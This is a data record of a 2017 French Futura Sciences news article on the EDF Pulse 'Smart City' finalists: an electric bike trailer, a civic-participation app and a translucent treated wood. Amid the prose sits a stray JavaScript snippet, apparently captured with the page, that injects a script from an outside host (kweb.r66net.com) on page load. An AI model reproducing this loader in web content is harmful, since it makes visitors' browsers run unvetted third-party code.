{"title": "Innovations : un bois \"augmente\" et une remorque electrique pour velo", "newspaper": "Futura Sciences", "author": ["Par la redaction de Futura"], "date_publi": "2017-08-28", "content": "Voici les trois finalistes des Prix EDF Pulse 2017 dans la categorie << Smart City >>, celle des innovations pour la ville. Les projets retenus contribuent a la rendre plus simple et agreable a vivre, et aussi plus respectueuse de l'environnement : K-Ryole, une remorque electrique qui, litteralement, suit le velo ; Fluicity, une application de citoyennete numerique pour retablir le lien avec les elus ; Woodoo, un bois << augmente >>, rendu transparent et imputrescible. N'oubliez pas que vous pouvez voter pour le Prix du public. Les finalistes Smart City du concours EDF Pulse 2017                       Les trois finalistes de la categorie << Smart City >> du concours EDF Pulse 2017 (qui a rassemble 529 candidats) nous expliquent leurs projets etonnants. Fluicity veut redynamiser la vie politique locale avec une application creant un lien direct entre citoyens et elus. K-Ryole est une ingenieuse remorque electrique electrique qui permet de transporter 250 kg de marchandises sans effort. Quant a Woodoo, Quant a Woodoo, la start-up modifie la structure moleculaire du bois pour le rendre translucide, plus resistant et imputrescible.                                       Cette quatrieme edition des  Prix EDF Pulse  reunit 529 entreprises, chacune ayant pose sa candidature dans l'une des quatre categories de la saison 2017 :  Smart Home ,  Smart Health , Smart City et la nouveaute de cette annee, Smart Business. Les quatre comites d'experts qui ont etudie ces dossiers ont retenu douze finalistes, soit trois par categorie. C'est un Grand Jury, reuni en septembre, qui designera les quatre laureats, un par categorie. Un cinquieme prix sera decerne par le public, au terme d'une campagne de votes de plusieurs semaines. Voir aussi : EDF Pulse 2017 : decouvrez les 12 nomines de l'innovation... et votez Le concours EDF Pulse attire de nombreuses entreprises depuis maintenant quatre ans. (c) EDF                               Des innovations pour la vie de la cite Dans la categorie << Smart City >>, plus de 120 projets figurent dans la competition. Les solutions imaginees par ces innovateurs touchent de nombreux domaines, comme les  transports  et l' energie  bien sur, mais aussi les reseaux citoyens, la reinvention du service des objets perdus ou des  materiaux nouveaux .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les comites d'experts ont retenu trois finalistes : Fluicity  : Cette  application  de participation citoyenne est concue pour rapprocher les habitants d'une commune et les elus locaux, en facilitant les echanges d'idees. Un citoyen peut communiquer directement avec les elus et tout le monde peut donner son avis sur une initiative. L'objectif est d'apporter un outil a tous ceux qui n'ont pas le temps ou le gout de s'impliquer dans la vie locale. K-Ryole  : Une remorque pour  velo  avec un moteur electrique, voila qui peut etre pratique, mais K-Ryole fait mieux : grace a des  capteurs , un systeme electronique determine si le velo tire (acceleration ou montee) ou bien freine (ralentissement ou descente) et ajuste la puissance en consequence. La remorque, ainsi, suit le velo. Woodoo  : Ce nouveau  materiau  est un  bois  << augmente >>, reconstruit par  chimie verte , pour remplacer la  lignine  par une petite  molecule  qui polymerise. Le processus rend le  bois translucide , imputrescible et plus resistant au  feu . Il peut etre utilise dans des produits de decoration, mais aussi en facades d'immeubles. En valorisant des essences peu ou pas utilisees aujourd'hui, ce procede permettrait des couts suffisamment faibles. ", "theme": "planete"}